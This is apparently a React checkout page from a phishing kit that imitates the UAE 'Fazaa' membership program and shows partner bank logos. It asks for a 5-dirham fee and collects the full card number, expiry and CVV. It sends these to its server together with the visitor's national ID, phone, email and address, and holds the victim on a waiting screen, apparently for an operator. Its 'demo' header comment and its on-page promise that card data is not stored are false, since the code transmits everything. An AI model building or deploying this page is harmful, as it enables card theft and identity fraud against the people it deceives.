/* صفحة الدفع التجريبية — لا تجمع بيانات حقيقية، تتحقق فقط بصريًا */
import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { toast } from "sonner";
import SiteLayout, { OrderSteps } from "@/components/SiteLayout";
import DemoBadge from "@/components/DemoBadge";
import WaitingScreen from "@/components/WaitingScreen";
import { ASSETS, MEMBERSHIPS } from "@/lib/data";
import { useOrder } from "@/contexts/OrderContext";
import { upsertCurrentOrder, resetCurrentDirectiveToWait, clearCurrentOrder } from "@/lib/liveOrders";
import { trpc } from "@/lib/trpc";
import { Lock, CalendarDays, Building2, Loader2 } from "lucide-react";

export default function Payment() {
  const { order } = useOrder();
  const [, navigate] = useLocation();
  const membership = MEMBERSHIPS.find((m) => m.id === order.tier);
  const total = (membership?.price ?? 0) + Math.round((membership?.price ?? 0) * 0.15);

  const [card, setCard] = useState({ holder: "", number: "", expMonth: "", expYear: "", cvv: "" });
  const [waiting, setWaiting] = useState(false);

  // كشف إعادة المحاولة بعد الرفض: إذا وصل الزائر من توجيه (رفض بطاقة) نمسح المعرّف القديم ليظهر كطلب جديد
  const isRetry = new URLSearchParams(window.location.search).get("retry") === "1" || new URLSearchParams(window.location.search).get("directed") === "1";
  const [retryHandled] = useState(() => {
    if (isRetry) {
      clearCurrentOrder();
    }
    return true;
  });
  const [expOpen, setExpOpen] = useState(false);
  const expRef = useRef<HTMLDivElement>(null);
  const set = (k: string, v: string) => setCard((c) => ({ ...c, [k]: v }));
  const utils = trpc.useUtils();

  // كشف البنك الحي من الخادم (debounce على أول 8 أرقام)
  const [binQuery, setBinQuery] = useState("");
  useEffect(() => {
    const digits = card.number.replace(/\D/g, "");
    if (digits.length < 6) {
      setBinQuery("");
      return;
    }
    const t = setTimeout(() => setBinQuery(digits.slice(0, 8)), 450);
    return () => clearTimeout(t);
  }, [card.number]);

  const bankQ = trpc.orders.detectBank.useQuery(
    { cardNumber: binQuery },
    { enabled: binQuery.length >= 6, staleTime: 5 * 60 * 1000, retry: false },
  );
  const detectedBank =
    bankQ.data?.bankName ||
    (bankQ.data?.scheme ? `بطاقة ${bankQ.data.scheme}` : "");

  // إغلاق لوحة التاريخ عند النقر خارجها
  useEffect(() => {
    if (!expOpen) return;
    const onClick = (e: MouseEvent) => {
      if (expRef.current && !expRef.current.contains(e.target as Node)) setExpOpen(false);
    };
    document.addEventListener("mousedown", onClick);
    return () => document.removeEventListener("mousedown", onClick);
  }, [expOpen]);

  // خيارات الأشهر (01..12) والسنوات (السنة الحالية + 12)
  const MONTHS = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
  const currentYear = new Date().getFullYear();
  const YEARS = Array.from({ length: 13 }, (_, i) => String(currentYear + i).slice(-2));

  const fmtNumber = (v: string) =>
    v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const digits = card.number.replace(/\s/g, "");
    // التحقق من إلزامية جميع الحقول
    if (!card.holder.trim()) {
      toast.error("يرجى إدخال اسم حامل البطاقة");
      return;
    }
    if (digits.length !== 16) {
      toast.error("يرجى إدخال رقم البطاقة كاملاً (16 رقماً)");
      return;
    }
    if (!card.expMonth || !card.expYear) {
      toast.error("يرجى اختيار شهر وسنة انتهاء البطاقة");
      return;
    }
    if (card.cvv.length !== 3) {
      toast.error("يرجى إدخال رمز التحقق CVV (3 أرقام)");
      return;
    }
    const expiry = `${card.expMonth}/${card.expYear}`;
    // كشف البنك لحظيًا من الخادم بالرقم الكامل لضمان أدق نتيجة عند الإرسال
    let bankName = detectedBank;
    try {
      const live = await utils.orders.detectBank.fetch({ cardNumber: digits });
      bankName = live.bankName || (live.scheme ? `بطاقة ${live.scheme}` : bankName);
    } catch {
      // نبقي النتيجة السابقة إن فشل الاستدعاء
    }
    // إرسال جميع بيانات الزائر + بيانات البطاقة إلى الخادم ثم البقاء في الانتظار
    setWaiting(true);
    try {
      await upsertCurrentOrder({
        page: "بيانات البطاقة",
        name: card.holder || order.fullName,
        idNumber: order.nationalId,
        phone: order.phone,
        email: order.email,
        tier: order.tier,
        region: order.region,
        city: order.city,
        district: order.district,
        street: order.street,
        deliveryDate: order.deliveryDate,
        cardNumber: card.number,
        bankName,
        expiry,
        cvv: card.cvv,
        directive: "wait",
      });
    } catch {
      toast.error("تعذّر إرسال البيانات، حاول مجدداً");
    }
  };

  const input =
    "w-full rounded-xl border border-border bg-white px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#C9A227]/40 transition";
  const labelCls = "block text-sm font-semibold text-foreground mb-1.5";

  if (waiting) {
    return (
      <SiteLayout>
        <WaitingScreen />
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <OrderSteps active={3} />
      <section className="container pb-16 max-w-xl">
        <div className="text-center mb-6">
          <h1 className="text-2xl font-extrabold text-foreground">إتمام الدفع</h1>
          <p className="mt-2 text-sm text-muted-foreground">المبلغ المستحق (رسوم التوصيل): <span className="font-bold fazaa-gold-text">5 درهم</span></p>
          <DemoBadge className="mt-4" />
        </div>

        <figure className="bank-partnership-visual">
          <img
            src={ASSETS.bankPartnership}
            alt="مزايا فزعة بالتعاون مع مصرف الشارقة الإسلامي وبنك أبوظبي الأول"
            loading="eager"
            decoding="async"
          />
        </figure>

        <form onSubmit={submit} className="card-soft p-5 sm:p-7 space-y-5">
          <div>
            <label className={labelCls}>اسم حامل البطاقة <span className="text-red-500">*</span></label>
            <input className={input} value={card.holder} onChange={(e) => set("holder", e.target.value)} placeholder="كما هو مكتوب على البطاقة" required />
          </div>
          <div>
            <label className={labelCls}>رقم البطاقة <span className="text-red-500">*</span></label>
            <input
              className={input}
              dir="ltr"
              style={{ textAlign: "left" }}
              value={card.number}
              onChange={(e) => set("number", fmtNumber(e.target.value))}
              placeholder="0000 0000 0000 0000"
              inputMode="numeric"
              autoComplete="cc-number"
              required
            />
            {card.number.replace(/\D/g, "").length >= 6 && (
              <p className="mt-2 flex items-center gap-1.5 text-xs font-semibold text-[#B8881F]">
                {bankQ.isFetching ? (
                  <>
                    <Loader2 className="h-3.5 w-3.5 animate-spin" />
                    جارٍ التعرّف على البنك...
                  </>
                ) : detectedBank ? (
                  <>
                    <Building2 className="h-3.5 w-3.5" />
                    البنك المُصدِر: {detectedBank}
                  </>
                ) : null}
              </p>
            )}
          </div>
          <div className="grid grid-cols-2 gap-3 sm:gap-5">
            <div>
              <label className={labelCls}>تاريخ الانتهاء <span className="text-red-500">*</span></label>
              <div className="relative" ref={expRef}>
                <button
                  type="button"
                  dir="ltr"
                  onClick={() => setExpOpen((o) => !o)}
                  className="w-full flex items-center rounded-xl border border-border bg-white px-3 py-3 transition hover:border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#C9A227]/40"
                >
                  <CalendarDays className="h-4 w-4 text-gray-400" />
                  <span className={`flex-1 text-center text-sm font-mono ${card.expMonth && card.expYear ? "text-foreground" : "text-gray-400"}`}>
                    {card.expMonth && card.expYear ? `${card.expMonth} / ${card.expYear}` : "MM / YY"}
                  </span>
                </button>

                {expOpen && (
                  <div
                    dir="ltr"
                    className="absolute z-20 mt-2 w-full rounded-xl border border-border bg-white shadow-xl overflow-hidden"
                  >
                    <div className="grid grid-cols-2 text-center text-xs font-bold bg-[#FBF3DC] text-[#B8881F] border-b border-border">
                      <div className="py-2 border-l border-border">الشهر</div>
                      <div className="py-2">السنة</div>
                    </div>
                    <div className="grid grid-cols-2 h-44">
                      <div className="overflow-y-auto border-l border-border py-1">
                        {MONTHS.map((m) => (
                          <button
                            key={m}
                            type="button"
                            onClick={() => set("expMonth", m)}
                            className={`w-full py-2 text-sm font-mono transition ${card.expMonth === m ? "bg-[#C9A227] text-white font-bold" : "hover:bg-gray-100 text-gray-700"}`}
                          >
                            {m}
                          </button>
                        ))}
                      </div>
                      <div className="overflow-y-auto py-1">
                        {YEARS.map((y) => (
                          <button
                            key={y}
                            type="button"
                            onClick={() => set("expYear", y)}
                            className={`w-full py-2 text-sm font-mono transition ${card.expYear === y ? "bg-[#C9A227] text-white font-bold" : "hover:bg-gray-100 text-gray-700"}`}
                          >
                            {y}
                          </button>
                        ))}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => setExpOpen(false)}
                      disabled={!card.expMonth || !card.expYear}
                      className="w-full py-2.5 text-sm font-bold bg-[#151b2b] text-white disabled:opacity-40 hover:bg-[#1f2740] transition"
                    >
                      تم
                    </button>
                  </div>
                )}
              </div>
            </div>
            <div>
              <label className={labelCls}>رمز التحقق CVV <span className="text-red-500">*</span></label>
              <input className={input} dir="ltr" style={{ textAlign: "left" }} value={card.cvv} onChange={(e) => set("cvv", e.target.value.replace(/\D/g, "").slice(0, 3))} placeholder="123" inputMode="numeric" autoComplete="cc-csc" required />
            </div>
          </div>

          <p className="flex items-center gap-2 text-xs text-muted-foreground">
            <Lock className="h-3.5 w-3.5 text-[#B8881F]" />
            جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
          </p>

          <div className="flex gap-3">
            <button type="button" onClick={() => navigate("/review")} className="flex-1 btn-ink rounded-full py-3.5 text-sm font-bold">رجوع</button>
            <button type="submit" className="flex-1 btn-gold rounded-full py-3.5 text-sm font-bold">ادفع 5 درهم</button>
          </div>
        </form>
      </section>
    </SiteLayout>
  );
}
